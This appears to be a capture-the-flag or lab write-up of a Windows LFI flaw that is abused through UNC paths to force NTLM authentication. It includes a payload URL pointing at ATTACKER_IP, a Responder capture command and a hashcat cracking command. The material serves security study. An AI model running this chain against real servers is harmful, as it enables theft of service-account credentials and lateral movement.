This vulnerability arises from a **Local File Inclusion** (LFI) flaw in a web application running on Windows, where user-controlled input is directly used to include files. By abusing Windows UNC path handling, an attacker can force the server to access a remote network resource, triggering automatic NTLM authentication. This allows interception of **NTLMv2** credentials of the service account running the web server, potentially leading to credential compromise and further lateral movement without requiring code execution.

---

## Example Scenario
The web application dynamically includes HTML content via the `view` parameter in `index.php`:

```
/index.php?view=...
```

This behavior is indicative of a **Local File Inclusion (LFI)** vulnerability. Initial testing confirms local file access on a Windows system, for example:

```
C:/Windows/System32/drivers/etc/hosts
```

Although basic filtering is present (blocking backslashes `\`), Windows paths can still be accessed by replacing backslashes with forward slashes `/`, allowing LFI bypass.

---

## UNC Path Abuse via LFI

Windows supports **UNC (Universal Naming Convention) paths**, which reference network resources:

```
\\SERVER\SHARE
```

In a web context, this can be expressed as:

```
 //SERVER/SHARE
```

When the web application attempts to include such a path, Windows interprets it as a network resource and attempts to access it over SMB.

**Example payload:**

```
http://school.flight.htb/index.php?view=//ATTACKER_IP/share
```

This is internally resolved as:

```
\\ATTACKER_IP\share
```

---

## Forced Authentication Behavior

To access a remote SMB resource, Windows must authenticate.  
This authentication happens automatically using the **security context of the running service**, in this case Apache.

Possible identities include:

- `NT AUTHORITY\SYSTEM`
- `NT AUTHORITY\NETWORK SERVICE`
- A domain or local service account (e.g. `DOMAIN\svc_apache`)

The authentication uses **NTLM**, typically resulting in an **NTLMv2 challenge-response**.

---

## Responder Role

**Responder** is a network poisoning and credential capture tool that listens for incoming authentication attempts over protocols such as:

- SMB
- HTTP
- LDAP
- MSSQL

Running Responder:

```bash
responder -I tun0 -v
```

When the target system attempts to access the UNC path, it sends NTLM authentication data to the attacker’s machine, which Responder captures.

---

## Attack Flow Summary

1. Attacker identifies LFI in a web application.
    
2. Attacker injects a UNC path via the LFI parameter.
    
3. Windows attempts to access the remote SMB resource.
    
4. Automatic NTLM authentication is triggered.
    
5. Responder captures the NTLMv2 hash of the service account.


---

## Post-Exploitation Value

Captured NTLMv2 hashes can be used for:

- Offline password cracking (Hashcat mode 5600)
- Identifying service accounts
- Lateral movement if credentials are reused
- Privilege escalation depending on account context

Example cracking command:

```bash
hashcat -m 5600 hash.txt rockyou.txt
```
